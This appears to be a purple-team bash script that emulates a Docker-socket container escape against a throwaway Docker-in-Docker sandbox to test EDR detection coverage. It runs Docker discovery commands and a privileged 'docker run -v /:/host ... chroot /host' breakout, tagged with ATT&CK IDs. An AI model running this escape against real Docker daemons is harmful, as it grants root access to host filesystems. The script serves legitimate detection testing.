#!/bin/bash
#
# run-docker-socket-escape.sh
# ---------------------------------------------------------------------------
# CLOUD/CONTAINER EDR (CDR) DETECTION COVERAGE — NON-PRODUCTION USE ONLY
#
# Emulates the classic "I have access to a Docker control plane" container
# breakout: discover the daemon, then spawn a new container with the host
# filesystem bind-mounted and privileged mode, and read/write through it.
#
# SAFETY: this talks ONLY to $DOCKER_HOST, which compose.privileged.yml
# points at a disposable Docker-in-Docker sandbox container
# (docker-sandbox), never the real host's /var/run/docker.sock. The "/"
# mounted into the spawned container below is docker-sandbox's own
# throwaway root filesystem — nothing on the machine actually running this
# environment is touched. Requires the compose.privileged.yml overlay — see its
# header for how to bring it up.
#
#   discover accessible Docker control plane   Container Admin Command (T1609)
#   spawn container with host mount + privileged Escape to Host           (T1611)
# ---------------------------------------------------------------------------
set -u
source "$(cd "$(dirname "$0")" && pwd)/lib-stealth.sh"

RESULTS_DIR="${RESULTS_DIR:-/home/root/results}"
SESSION="$(date +%s)"
LOG="${RESULTS_DIR}/dockerescape_${SESSION}.log"

mkdir -p "$RESULTS_DIR"
say() { echo -e "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG"; }
step() { echo "" | tee -a "$LOG"; say "=== $* ==="; }

say "Cymylau :: Docker-socket escape emulation :: session=$SESSION"

if [ -z "${DOCKER_HOST:-}" ]; then
    say "!! DOCKER_HOST not set. Bring the environment up with the privileged overlay:"
    say "     docker compose -f compose.yml -f compose.privileged.yml up -d"
    exit 1
fi
if ! command -v docker >/dev/null 2>&1; then
    say "!! docker CLI not installed — run: bash playbooks/install-container-tools.sh"
    exit 1
fi

step "discovery — probe the accessible Docker control plane (ATT&CK T1609)"
st_mark T1609 "docker-discovery"
act "$ST_TECH" "docker version" docker-sandbox "$DOCKER_HOST"
docker version 2>&1 | tee -a "$LOG"
say "containers currently visible on this control plane:"
act "$ST_TECH" "docker ps -a" docker-sandbox "$DOCKER_HOST"
docker ps -a 2>&1 | tee -a "$LOG"

step "escape — spawn a privileged container with the daemon's host fs mounted (ATT&CK T1611)"
st_mark T1611 "privileged-container-escape"
act "$ST_TECH" "docker run --rm --privileged -v /:/host alpine:3.20 chroot /host" docker-sandbox "$DOCKER_HOST"
OUT="$(docker run --rm --privileged -v /:/host alpine:3.20 chroot /host sh -c \
    'echo "escaped: $(id)"; echo "escaped-hostname: $(hostname)"; echo "escaped-root-listing:"; ls /' 2>&1)"
say "breakout result (this is docker-sandbox's own disposable root, not the real host):"
echo "$OUT" | tee -a "$LOG"

step "Done — Docker-socket escape emulation complete."
say "artifacts: $LOG"

act_summary
